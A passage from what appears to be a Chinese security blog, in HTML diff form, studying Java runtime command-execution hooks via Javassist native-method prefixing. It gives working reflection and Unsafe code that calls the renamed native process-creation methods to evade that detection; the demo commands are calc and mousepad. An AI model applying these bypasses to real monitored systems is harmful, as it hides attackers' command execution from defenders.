class="string">&quot;System.out.println(\&quot;检测到命令执行操作，内容为：\&quot;+a);&quot;</span>+</span><br><span class="line">                            <span class="string">&quot;return ko1sh1_create(a,b,c,new long[]&#123;-1,-1,-1&#125;,false); &quot;</span> +</span><br><span class="line">                            <span class="string">&quot;&#125;&quot;</span>, clazz);</span><br><span class="line">                    method2.setModifiers(Modifier.PRIVATE | Modifier.STATIC | Modifier.SYNCHRONIZED);</span><br><span class="line">                    clazz.addMethod(method2);</span><br><span class="line"></span><br><span class="line">                    <span class="type">byte</span>[] bytes = clazz.toBytecode();</span><br><span class="line">                    <span class="keyword">return</span> bytes;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="string">&quot;java.lang.UNIXProcess&quot;</span>.equals(className)) &#123;</span><br><span class="line">                        clazz = pool.getCtClass(className);</span><br><span class="line">                        <span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;int ko1sh1_forkAndExec(int var1, byte[] var2, byte[] var3, byte[] var4, int var5, byte[] var6, int var7, byte[] var8, int[] var9, boolean var10);&quot;</span>, clazz);</span><br><span class="line">                        method.setModifiers(Modifier.PRIVATE | Modifier.NATIVE);</span><br><span class="line">                        clazz.addMethod(method);</span><br><span class="line"></span><br><span class="line">                        <span class="type">CtMethod</span> <span class="variable">method1</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;forkAndExec&quot;</span>);</span><br><span class="line">                        clazz.removeMethod(method1);</span><br><span class="line"></span><br><span class="line">                        <span class="type">CtMethod</span> <span class="variable">method2</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;int forkAndExec(int var1, byte[] var2, byte[] var3, byte[] var4, int var5, byte[] var6, int var7, byte[] var8, int[] var9, boolean var10) throws java.io.IOException &#123; System.out.println(\&quot;检测到系统命令执行，内容为: \&quot; + new java.lang.String(var3)); return this.ko1sh1_forkAndExec(var1, var2, var3, var4, var5, var6, var7, var8, var9, var10); &#125;&quot;</span>, clazz);</span><br><span class="line">                        method2.setModifiers(Modifier.PRIVATE);</span><br><span class="line">                        clazz.addMethod(method2);</span><br><span class="line"></span><br><span class="line">                        <span class="type">byte</span>[] bytes = clazz.toBytecode();</span><br><span class="line">                        <span class="keyword">return</span> bytes;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>尝试使用之前的方式进行绕过</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Hook._native;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">_OriginalByPass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;./src/main/java/Hook/_native/jars/agentmain.jar&quot;</span>;</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor v:list)&#123;</span><br><span class="line">            <span class="keyword">if</span> (v.displayName().contains(<span class="string">&quot;_OriginalByPass&quot;</span>))&#123;</span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">vm</span> <span class="operator">=</span> VirtualMachine.attach(v.id());</span><br><span class="line">                vm.loadAgent(path);</span><br><span class="line">                System.out.println(<span class="string">&quot;---- 绕过操作 ----&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line"><span class="comment">//                    Runtime.getRuntime().exec(&quot;whoami&quot;);</span></span><br><span class="line">                    bypass_hook_windows(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//                    Runtime.getRuntime().exec(&quot;mousepad&quot;);</span></span><br><span class="line">                    bypass_hook_linux(<span class="string">&quot;mousepad&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                vm.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bypass_hook_windows</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">processClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmdstr</span> <span class="operator">=</span> cmd;</span><br><span class="line">        <span class="type">String</span> <span class="variable">envblock</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">dir</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">long</span>[] stdHandles = <span class="keyword">new</span> <span class="title class_">long</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="comment">// 这里将 redirectErrorStream 设置为 true 以便于将错误输出重定向到标准输出</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">redirectErrorStream</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">create</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;create&quot;</span>, String.class, String.class, String.class, <span class="type">long</span>[].class, <span class="type">boolean</span>.class);</span><br><span class="line">        create.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 由于 create 方法是静态方法，甚至都不用实例化对象就行。</span></span><br><span class="line">        create.invoke(<span class="literal">null</span>, cmdstr, envblock, dir, stdHandles, redirectErrorStream);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bypass_hook_linux</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">processClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            processClass = Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            processClass = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">processObject</span> <span class="operator">=</span> unsafe_getObject(processClass);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">launchMechanism</span> <span class="operator">=</span> getFieldValue(processObject, <span class="string">&quot;launchMechanism&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">ordinal</span> <span class="operator">=</span> ((<span class="type">int</span>) launchMechanism.getClass().getMethod(<span class="string">&quot;ordinal&quot;</span>).invoke(launchMechanism)) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">byte</span>[] helperpath = getFieldValue(processObject, <span class="string">&quot;helperpath&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] prog = <span class="keyword">new</span> <span class="title class_">byte</span>[cmd.getBytes().length + <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(cmd.getBytes(), <span class="number">0</span>, prog, <span class="number">0</span>, cmd.getBytes().length);</span><br><span class="line">        <span class="type">byte</span>[] argBlock = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">argc</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">byte</span>[] envBlock = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">envc</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">byte</span>[] dir = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">int</span>[] fds = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">redirectErrorStream</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">forkAndExecMethod</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;forkAndExec&quot;</span>, <span class="type">int</span>.class, <span class="type">byte</span>[].class,</span><br><span class="line">                <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>[].class, <span class="type">boolean</span>.class);</span><br><span class="line">        forkAndExecMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        forkAndExecMethod.invoke(processObject, ordinal, helperpath, prog, argBlock, argc,</span><br><span class="line">                envBlock, envc, dir, fds, redirectErrorStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">unsafe_getObject</span><span class="params">(Class&lt;? <span class="built_in">super</span> T&gt; objectClass)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">unsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        unsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) ((Unsafe) unsafeField.get(<span class="literal">null</span>)).allocateInstance(objectClass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">getFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        <span class="keyword">return</span> (T) field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">            <span class="keyword">if</span> (field != <span class="literal">null</span>)</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> field;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!clazz.getSuperclass().equals(Object.class)) &#123;</span><br><span class="line">                <span class="keyword">return</span> getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240324144827295.png"
+                      alt="image-20240324144827295"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240324144912864.png"
+                      alt="image-20240324144912864"
+                ></p>
+<p>可以发现在 linux 下和 windows 下均被拦截检测到了。</p>
+<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p>通过上面的内容可以发现，其实本质上只是改变了执行命令的函数名称而已，只要我们能找到命令执行的函数名称（其实很好找到，因为都是加前缀，后面的内容就是原本函数的名字都不会变），就还是能绕过检测的，所以其实绕过很简单，只要反射不去调用 <code>create</code> 方法，而是去调用 <code>ko1sh1_create</code> 就行。所以只要在每次执行时进行检测就行，这里以方便的 windows 为例。</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Hook._native;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">_ByPass1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;./src/main/java/Hook/_native/jars/agentmain.jar&quot;</span>;</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor v:list)&#123;</span><br><span class="line">            <span class="keyword">if</span> (v.displayName().contains(<span class="string">&quot;_ByPass1&quot;</span>))&#123;</span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">vm</span> <span class="operator">=</span> VirtualMachine.attach(v.id());</span><br><span class="line">                vm.loadAgent(path);</span><br><span class="line">                <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    bypass_hook_windows(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    bypass_hook_linux(<span class="string">&quot;mousepad&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                vm.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bypass_hook_windows</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">processClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmdstr</span> <span class="operator">=</span> cmd;</span><br><span class="line">        <span class="type">String</span> <span class="variable">envblock</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">dir</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">long</span>[] stdHandles = <span class="keyword">new</span> <span class="title class_">long</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="comment">// 这里将 redirectErrorStream 设置为 true 以便于将错误输出重定向到标准输出</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">redirectErrorStream</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (Method method : processClass.getDeclaredMethods()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (method.getName().endsWith(<span class="string">&quot;create&quot;</span>) &amp;&amp; !method.getName().equals(<span class="string">&quot;create&quot;</span>)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;修改后的方法名为：&quot;</span>+method.getName()+<span class="string">&quot;, 绕过成功！&quot;</span>);</span><br><span class="line">                method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                method.invoke(<span class="literal">null</span>, cmdstr, envblock, dir, stdHandles, redirectErrorStream);</span><br><span class="line">                flag = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flag)&#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">create</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;create&quot;</span>, String.class, String.class, String.class, <span class="type">long</span>[].class, <span class="type">boolean</span>.class);</span><br><span class="line">            create.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            create.invoke(<span class="literal">null</span>, cmdstr, envblock, dir, stdHandles, redirectErrorStream);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bypass_hook_linux</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">processClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            processClass = Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            processClass = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">processObject</span> <span class="operator">=</span> unsafe_getObject(processClass);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">launchMechanism</span> <span class="operator">=</span> getFieldValue(processObject, <span class="string">&quot;launchMechanism&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">ordinal</span> <span class="operator">=</span> ((<span class="type">int</span>) launchMechanism.getClass().getMethod(<span class="string">&quot;ordinal&quot;</span>).invoke(launchMechanism)) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">byte</span>[] helperpath = getFieldValue(processObject, <span class="string">&quot;helperpath&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] prog = <span class="keyword">new</span> <span class="title class_">byte</span>[cmd.getBytes().length + <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(cmd.getBytes(), <span class="number">0</span>, prog, <span class="number">0</span>, cmd.getBytes().length);</span><br><span class="line">        <span class="type">byte</span>[] argBlock = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">argc</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">byte</span>[] envBlock = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">envc</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">byte</span>[] dir = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">int</span>[] fds = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">redirectErrorStream</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Method method : processClass.getDeclaredMethods()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (method.getName().endsWith(<span class="string">&quot;forkAndExec&quot;</span>) &amp;&amp; !method.getName().equals(<span class="string">&quot;forkAndExec&quot;</span>)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;修改后的方法名为：&quot;</span>+method.getName()+<span class="string">&quot;, 绕过成功！&quot;</span>);</span><br><span class="line">                method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                method.invoke(processObject, ordinal, helperpath, prog, argBlock, argc,</span><br><span class="line">                        envBlock, envc, dir, fds, redirectErrorStream);</span><br><span class="line">                flag = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flag)&#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">forkAndExecMethod</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;forkAndExec&quot;</span>, <span class="type">int</span>.class, <span class="type">byte</span>[].class,</span><br><span class="line">                    <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>[].class, <span class="type">boolean</span>.class);</span><br><span class="line">            forkAndExecMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            forkAndExecMethod.invoke(processObject, ordinal, helperpath, prog, argBlock, argc,</span><br><span class="line">                    envBlock, envc, dir, fds, redirectErrorStream);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">unsafe_getObject</span><span class="params">(Class&lt;? <span class="built_in">super</span> T&gt; objectClass)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">unsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        unsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) ((Unsafe) unsafeField.get(<span class="literal">null</span>)).allocateInstance(objectClass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">getFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        <span class="keyword">return</span> (T) field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">            <span class="keyword">if</span> (field != <span class="literal">null</span>)</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> field;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!clazz.getSuperclass().equals(Object.class)) &#123;</span><br><span class="line">                <span class="keyword">return</span> 